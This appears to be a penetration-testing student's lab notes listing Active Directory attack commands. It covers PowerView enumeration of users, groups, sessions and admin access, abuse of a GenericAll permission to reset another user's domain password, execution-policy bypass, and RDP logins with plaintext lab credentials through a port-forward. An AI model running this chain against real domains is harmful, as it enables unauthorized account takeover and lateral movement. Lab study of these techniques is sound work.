### 05-Oct-23 Thu

![](Pasted%20image%2020231005205250.png)

1. Initial Foothold
2. Enumeration
3. Lateral Movement
4. Domain Compromise

```
powershell -ExecutionPolicy Bypass -File script.ps1
```

```
Import-Moudle .\PowerView.ps1
```

```
Get-NetUser | select samaccountname,lastlogon
```

```
net group "Group-Name" /domain
```

```
Get-NetGroup "Group-Name" | select member
```

```
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
```

```
Resolve-IPAddress $dnshostname
```

```
Find-LocalAdminAccess
```

```
Get-NetSession -ComputerName $dnshostname -Verbose
```

```
Get-Acl -Path HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
```

```
Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
```

![](Pasted%20image%2020231006211541.png)

```
.\PsLoggedon.exe \\files04
```

```
Get-ObjectAcl -Identity "Management Department" | ?
{$_.ActiveDirectoryRights -eq "GenericAll"} | select
SecurityIdentifier,ActiveDirectoryRights
```

```
"S-1-5-21-1987370270-
658905905-1781884369-1104" | Convert-SidToName
```

```
CORP\stephanie
```

```
net user jen Password123 /domain
```

```
runas /user:corp\jen powershell.exe
```

```
powershell -ep bypass
```

```
Import-Module .\PowerView.ps1
```

```
Find-LocalAdminAccess
```

```
xfreerdp /u:stephanie /d:corp.com /v:192.168.50.75
```

```
xfreerdp /u:jeffadmin /v:192.168.226.70 /smart-sizing:1920x1200
```

Get Shift Done!

```
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.50.64
```

```
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
```

